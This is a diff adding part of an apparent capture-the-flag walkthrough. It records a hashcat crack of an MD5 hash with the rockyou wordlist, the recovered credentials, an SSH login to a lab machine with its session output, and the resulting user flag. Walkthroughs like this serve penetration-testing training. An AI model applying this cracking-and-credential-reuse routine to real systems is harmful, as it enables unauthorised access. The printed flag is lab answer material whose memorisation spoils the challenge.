@@ -79,4 +79,39 @@ hashcat -a 0 -m 20 hash /usr/share/wordlists/rockyou.txt
 <--snip-->
 ```
 
+**Credentials**
+Username : jkr
 Password : raykayjay9
+
+### SSH
+#
+
+This can be used to access SSH on port 22 identified on our port scan. 
+
+```bash
+ssh jkr@10.129.229.158                 
+The authenticity of host '10.129.229.158 (10.129.229.158)' can't be established.
+ED25519 key fingerprint is SHA256:TRwEhcL3WcCSS2iITDucAKYtASZxNYORzfYzuJlPvN4.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.129.229.158' (ED25519) to the list of known hosts.
+jkr@10.129.229.158's password: 
+Linux writeup 6.1.0-13-amd64 x86_64 GNU/Linux
+
+The programs included with the Devuan GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Wed Oct 25 11:04:00 2023 from 10.10.14.23
+jkr@writeup:~$ whoami
+jkr
+jkr@writeup:~$ cat user.txt
+ec6a7fb1a03144dd6d6568b17dd85296
+```
+
+### User Flag
+#
+
+User Flag: ec6a7fb1a03144dd6d6568b17dd85296
